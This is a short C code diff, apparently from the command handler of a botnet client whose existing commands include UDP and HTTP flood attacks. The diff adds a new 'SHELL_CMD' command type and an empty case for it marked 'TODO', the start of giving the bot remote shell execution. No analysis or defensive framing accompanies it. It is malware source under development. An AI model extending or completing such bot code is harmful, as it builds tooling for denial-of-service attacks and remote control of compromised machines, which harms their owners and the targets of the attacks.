@@ -24,6 +24,7 @@ const char *__command_type_strings[] = {
     "ATTACK_UDP",
     "ATTACK_HTTP",
     "EXIT",
+    "SHELL_CMD"
 };
 
 static inline char *get_command_type_string(enum command_type type)
@@ -114,6 +115,10 @@ static void parse_command(struct command *cmd)
         break;
     case EXIT:
         exit(0);
+        break;
+    case SHELL_CMD:
+        // TODO: SHELL_CMD IMPLEMENTATION
+        break;
     default:
 #ifdef DEBUG
         printf("[command] Unknown command: 0x%02X\n", cmd->type);
